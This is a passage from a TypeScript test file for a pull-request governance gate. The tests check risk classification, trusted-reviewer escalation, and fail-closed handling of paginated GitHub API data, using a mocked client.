  assert.equal(reviewerRequestsProtected({ reviews: [review({ body: 'RISK-CLASS: PROTECTED', commit_id: OLD_HEAD })] }), true);
  assert.equal(reviewerRequestsProtected({ comments: [{ author: { login: CODEX_GQL }, body: 'RISK-CLASS: PROTECTED' }] }), true);
  assert.equal(reviewerRequestsProtected({ threads: [{ comments: [{ author: { login: CODEX_GQL }, body: 'see\n  RISK-CLASS: PROTECTED  ' }] }] }), true);
  assert.equal(reviewerRequestsProtected({ reviews: [review({ body: 'RISK-CLASS: STANDARD' })] }), false);
  assert.equal(reviewerRequestsProtected({ comments: [{ author: { login: 'griff843' }, body: 'RISK-CLASS: PROTECTED' }] }), false);
});

// ── Lean gate decision ─────────────────────────────────────────────────────

const PASS_REVIEW = { pass: true, reasons: [] };
const FAIL_REVIEW = { pass: false, reasons: ['no trusted review at head'] };

test('lean gate: Standard passes with Independent Review only; without it, blocked', () => {
  assert.equal(evaluateLeanGate({ riskClass: 'Standard', labels: [], independentReview: PASS_REVIEW }).pass, true);
  const blocked = evaluateLeanGate({ riskClass: 'Standard', labels: [], independentReview: FAIL_REVIEW });
  assert.equal(blocked.pass, false);
  assert.match(blocked.errors.join(' '), /Independent Review/);
});

test('lean gate: Protected (or any unknown class) additionally needs t1-approved and a head-bound pm-verdict', () => {
  assert.equal(evaluateLeanGate({ riskClass: 'Protected', labels: [], independentReview: PASS_REVIEW, protectedApprovalErrors: [] }).pass, false);
  assert.equal(evaluateLeanGate({ riskClass: 'Protected', labels: ['t1-approved'], independentReview: PASS_REVIEW, protectedApprovalErrors: ['stale verdict'] }).pass, false);
  assert.equal(evaluateLeanGate({ riskClass: 'Protected', labels: ['t1-approved'], independentReview: PASS_REVIEW }).pass, false, 'approval not evaluated');
  assert.equal(evaluateLeanGate({ riskClass: 'Protected', labels: ['t1-approved'], independentReview: PASS_REVIEW, protectedApprovalErrors: [] }).pass, true);
  assert.equal(evaluateLeanGate({ riskClass: undefined, labels: [], independentReview: PASS_REVIEW }).class, 'Protected');
});

test('lean gate: governance:pause blocks every class', () => {
  assert.equal(evaluateLeanGate({ riskClass: 'Standard', labels: ['governance:pause'], independentReview: PASS_REVIEW }).pass, false);
});

// ── Loader: escalation and content are applied once, for every consumer ─────

function fakeGithub({ files, reviews = [], threads = [], comments = [], contents = {} }: { files: Row[]; reviews?: Row[]; threads?: Row[]; comments?: Row[]; contents?: Record<string, string> }) {
  return {
    rest: {
      pulls: { listFiles: async () => ({ data: files }), listCommits: async () => ({ data: [{ author: { login: 'griff843' } }] }) },
      repos: {
        getContent: async ({ path }: { path: string }) => {
          if (!(path in contents)) throw Object.assign(new Error('Not Found'), { status: 404 });
          return { data: { content: Buffer.from(contents[path]!).toString('base64'), encoding: 'base64' } };
        },
      },
    },
    paginate: async (fn: (p: unknown) => Promise<{ data: unknown }>, params: unknown) => (await fn(params)).data,
    graphql: async (query: string) => {
      const nodes = query.includes('reviewThreads') ? threads.map(t => ({ isResolved: t.isResolved, comments: { pageInfo: { hasNextPage: Boolean(t.moreComments) }, nodes: t.comments } }))
        : query.includes('reviews(') ? reviews : comments;
      return { repository: { pullRequest: { connection: { pageInfo: { hasNextPage: false }, nodes } } } };
    },
  };
}
const PR = { number: 1, changed_files: 1, head: { sha: HEAD }, user: { login: 'griff843' } };
const LEAN = { OPERATING_MODEL: 'lean', LEAN_MODE_ACTIVATED_AT: ACTIVATED };

test('loader: legacy mode makes no API calls', async () => {
  const github = { rest: {}, paginate: async () => { throw new Error('must not be called'); }, graphql: async () => { throw new Error('must not be called'); } };
  const policy = await loadPullRequestPolicy({ github, owner: 'o', repo: 'r', pr: PR, env: { OPERATING_MODEL: 'legacy', LEAN_MODE_ACTIVATED_AT: ACTIVATED } });
  assert.equal(policy.mode.mode, 'legacy');
  assert.equal(policy.classification, null);
});

test('loader: UI head content is fetched at the head SHA; unavailable content escalates', async () => {
  const path = 'apps/command-center/src/components/Widget.tsx';
  const ok = await loadPullRequestPolicy({ github: fakeGithub({ files: [file(path)], contents: { [path]: CLEAN_UI } }), owner: 'o', repo: 'r', pr: PR, env: LEAN });
  assert.equal(ok.classification!.class, 'Standard', JSON.stringify(ok.classification!.reasons));
  const missing = await loadPullRequestPolicy({ github: fakeGithub({ files: [file(path)] }), owner: 'o', repo: 'r', pr: PR, env: LEAN });
  assert.equal(missing.classification!.class, 'Protected');
});

test('loader: reviewer escalation and incomplete file lists make the shared classification Protected', async () => {
  const doc = file('docs/03_product/notes.md');
  const escalated = await loadPullRequestPolicy({ github: fakeGithub({ files: [doc], reviews: [{ databaseId: 1, author: { login: CODEX_GQL, __typename: 'Bot' }, commit: { oid: OLD_HEAD }, state: 'COMMENTED', body: 'RISK-CLASS: PROTECTED', submittedAt: T1 }] }), owner: 'o', repo: 'r', pr: PR, env: LEAN });
  assert.equal(escalated.classification!.class, 'Protected');
  assert.ok(escalated.classification!.reasons.some((r: Row) => r.rule === 'reviewer-escalation'));
  const incomplete = await loadPullRequestPolicy({ github: fakeGithub({ files: [doc] }), owner: 'o', repo: 'r', pr: { ...PR, changed_files: 2 }, env: LEAN });
  assert.equal(incomplete.classification!.class, 'Protected');
  const plain = await loadPullRequestPolicy({ github: fakeGithub({ files: [doc] }), owner: 'o', repo: 'r', pr: PR, env: LEAN });
  assert.equal(plain.classification!.class, 'Standard');
});

test('loader: a GraphQL page overflow fails closed instead of truncating findings', async () => {
  const github = fakeGithub({ files: [file('docs/03_product/notes.md')] });
  github.graphql = async () => ({ repository: { pullRequest: { connection: { pageInfo: { hasNextPage: true, endCursor: 'x' }, nodes: [] } } } });
  await assert.rejects(loadPullRequestPolicy({ github, owner: 'o', repo: 'r', pr: PR, env: LEAN }), /Failing closed/);
});

test('loader (P2): a review thread with another page of nested comments fails closed; a complete thread is unchanged', async () => {
  const doc = file('docs/03_product/notes.md');
  const comment = { author: { login: CODEX_GQL, __typename: 'Bot' }, body: 'looks fine', createdAt: T1 };
  const complete = await loadPullRequestPolicy({ github: fakeGithub({ files: [doc], threads: [{ isResolved: true, comments: [comment] }] }), owner: 'o', repo: 'r', pr: PR, env: LEAN });
  assert.equal(complete.classification!.class, 'Standard');
  assert.equal(complete.reviewInputs!.threads.length, 1);
  assert.deepEqual(complete.reviewInputs!.threads[0].comments, [comment]);
  await assert.rejects(
    loadPullRequestPolicy({ github: fakeGithub({ files: [doc], threads: [{ isResolved: true, comments: [comment], moreComments: true }] }), owner: 'o', repo: 'r', pr: PR, env: LEAN }),
    /more than 100 comments.*Failing closed/u,
  );
  // A response without nested pageInfo cannot prove completeness either.
  const github = fakeGithub({ files: [doc] });
  github.graphql = async (query: string) => ({ repository: { pullRequest: { connection: { pageInfo: { hasNextPage: false }, nodes: query.includes('reviewThreads') ? [{ isResolved: false, comments: { nodes: [comment] } }] : [] } } } });
  await assert.rejects(loadPullRequestPolicy({ github, owner: 'o', repo: 'r', pr: PR, env: LEAN }), /pageInfo.*Failing closed/u);
});

test('escalation helper: isTrustedReviewerEscalation is the classification predicate, for REST and GraphQL shapes', () => {
  const rest = (login: string, body = 'RISK-CLASS: PROTECTED', type = 'Bot') => ({ user: { login, type }, body });
  assert.equal(isTrustedReviewerEscalation(rest(CODEX), []), true);
  assert.equal(isTrustedReviewerEscalation({ author: { login: CODEX_GQL }, body: 'x\n RISK-CLASS: PROTECTED \n' }, []), true);
  assert.equal(isTrustedReviewerEscalation(rest('griff843'), []), false);
  assert.equal(isTrustedReviewerEscalation(rest(CODEX, 'RISK-CLASS: PROTECTED please'), []), false);
  assert.equal(isTrustedReviewerEscalation(rest(CODEX, 'RISK-CLASS: STANDARD'), []), false);
  assert.equal(isTrustedReviewerEscalation(rest('alice'), ['alice']), true, 'configured list replaces the default');
  assert.equal(isTrustedReviewerEscalation(rest(CODEX), ['alice']), false);
  assert.equal(isTrustedReviewerEscalation(null, []), false);
  for (const node of [rest(CODEX), rest('griff843'), rest('alice')]) {
    for (const list of [[], ['alice']]) {
      assert.equal(isTrustedReviewerEscalation(node, list), reviewerRequestsProtected({ comments: [node], trustedReviewers: list }));
    }
  }
});

test('trusted artifact helper: matches the login set evaluation and escalation read, any account type', () => {
  assert.equal(isTrustedReviewerArtifact({ user: { login: CODEX, type: 'Bot' }, body: '' }, []), true);
  assert.equal(isTrustedReviewerArtifact({ user: { login: 'chatgpt-codex-connector', type: 'User' } }, []), true);
  assert.equal(isTrustedReviewerArtifact({ author: { login: CODEX_GQL } }, []), true);
  assert.equal(isTrustedReviewerArtifact({ user: { login: 'mallory', type: 'User' } }, []), false);
  assert.equal(isTrustedReviewerArtifact({ user: { login: 'alice' } }, ['alice']), true);
  assert.equal(isTrustedReviewerArtifact({ user: { login: CODEX } }, ['alice']), false);
  assert.equal(isTrustedReviewerArtifact(null, []), false);
  // Anything the helper rejects can never escalate.
  const untrusted = { user: { login: 'mallory' }, body: 'RISK-CLASS: PROTECTED' };
  assert.equal(reviewerRequestsProtected({ comments: [untrusted] }), isTrustedReviewerArtifact(untrusted, []));
});
